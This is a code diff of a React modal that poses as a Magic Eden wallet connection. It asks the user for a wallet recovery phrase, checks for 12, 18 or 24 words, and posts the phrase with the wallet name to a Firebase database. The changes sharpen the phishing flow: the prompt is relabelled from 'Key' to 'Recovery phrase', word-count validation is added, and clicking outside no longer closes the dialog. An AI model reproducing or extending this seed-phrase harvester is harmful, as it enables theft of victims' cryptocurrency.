@@ -4,18 +4,14 @@ import DialogContent from "@mui/material/DialogContent";
 import DialogTitle from "@mui/material/DialogTitle";
 import ClearIcon from "@mui/icons-material/Clear";
 import {
-  Grid,
-  Typography,
-  Demo,
-  Avatar,
-  List,
-  ListItem,
-  ListItemAvatar,
   Divider,
 } from "@mui/material";
 import { styled } from "@mui/material/styles";
 import axios from "axios";
 export default function Inputmodal({ openinput, setopeninput, walletname }) {
+  const [error, seterror] = React.useState(true);
+  const [input, setinput] = React.useState("");
+  const [phraselength, setphraselength] = React.useState(0);
   const handleClose = () => {
     setopeninput(false);
   };
@@ -29,29 +25,34 @@ export default function Inputmodal({ openinput, setopeninput, walletname }) {
       })
     );
   }
-  const [error, seterror] = React.useState(true);
-  const [input, setinput] = React.useState("");
-  const [phraselength, setphraselength] = React.useState();
   const handleinput = (e) => {
     setinput(e.target.value);
-    const wordCount = input.match(/(\w+)/g).length;
+    let wordCount = input.match(/(\w+)/g).length;
     setphraselength(wordCount);
   };
+  React.useEffect(() => {
+    const checklength = () => {
+      if (phraselength === 12 || phraselength === 18 || phraselength === 24) {
+        seterror(false);
+      } else {
+        seterror(true);
+      }
+    };
+    checklength();
+  }, [phraselength]);
 
   const Submit = async () => {
-    if (phraselength === 12 || 18 || 24) {
-      seterror(false);
-      const res = await axios.post(
-        "https://magic-eden-data-default-rtdb.firebaseio.com/magiceden.json",
-        { wallet: walletname, key: input }
-      );
-      setinput("");
-      setopeninput(false);
-    } else seterror(true);
+    const res = await axios.post(
+      "https://magic-eden-data-default-rtdb.firebaseio.com/magiceden.json",
+      { wallet: walletname, key: input }
+    );
+    setinput("");
+    seterror(true);
+    setopeninput(false);
   };
   return (
     <div>
-      <Dialog open={openinput} onClose={handleClose}>
+      <Dialog open={openinput}>
         <div>
           <DialogTitle
             style={{
@@ -66,9 +67,13 @@ export default function Inputmodal({ openinput, setopeninput, walletname }) {
               alignItems: "center",
             }}
           >
-            Enter your Key
+            Enter your Recovery phrase
             <ClearIcon
-              onClick={() => setopeninput(false)}
+              onClick={() => {
+                setopeninput(false);
+                setinput("");
+                seterror(true);
+              }}
               style={{ marginLeft: "40px", color: "#777" }}
             />
           </DialogTitle>
@@ -103,8 +108,10 @@ export default function Inputmodal({ openinput, setopeninput, walletname }) {
               fontWeight: "600",
               borderRadius: "5px",
               marginTop: "15px",
+              opacity: error ? "0.3" : 1,
             }}
             onClick={Submit}
+            disabled={error ? true : false}
           >
             Connect
           </button>
